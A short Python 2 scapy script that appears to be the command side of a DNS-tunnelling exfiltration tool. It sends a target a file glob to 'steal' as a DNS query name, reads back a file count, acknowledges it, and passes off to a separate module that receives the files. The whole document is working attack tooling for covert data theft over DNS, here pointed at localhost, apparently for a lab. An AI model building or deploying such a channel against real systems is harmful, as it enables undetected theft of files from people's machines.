from scapy.all import *

import fileReceiver

ip = "127.0.0.1"
pk = IP(src=ip, dst=ip) / UDP(dport=53)  # /DNS()
pck_ok = pk / DNS(rd=1, qd=DNSQR(qname="OK"))
path = "/home/mrrobot/Desktop/"
dir_list = "/home/mrrobot/Desktop/dns_files/*.txt"
num = 0


def sendPathToSteal():
    pck = pk / DNS(rd=1, qd=DNSQR(qname=dir_list))
    send(pck, verbose=0)


def n_filter(pck):
    if pck.haslayer("IP"):
        if pck[IP].dst == ip:
            if pck.haslayer('UDP') and pck.haslayer('DNSQR'):
                if pck[UDP].dport == 53:  # and pck[IP].src == "192.168.1.107":
                    print pck
                    return True
    return False


def getNumberOfFiles():
    t = sniff(count=1, lfilter=n_filter)[0]
    num = int(t[DNSQR].qname[:-1])
    print str(num) + " files"
    time.sleep(3)
    print "Sending Ack on number of files"
    send(pck_ok, verbose=0)
    return num


def main():
    print "Sending dir list..."
    sendPathToSteal()

    print "Getting number of files"
    num = getNumberOfFiles()

    fileReceiver.receiveFiles(num)

    print "Finished getting all files"


if __name__ == "__main__":
    main()
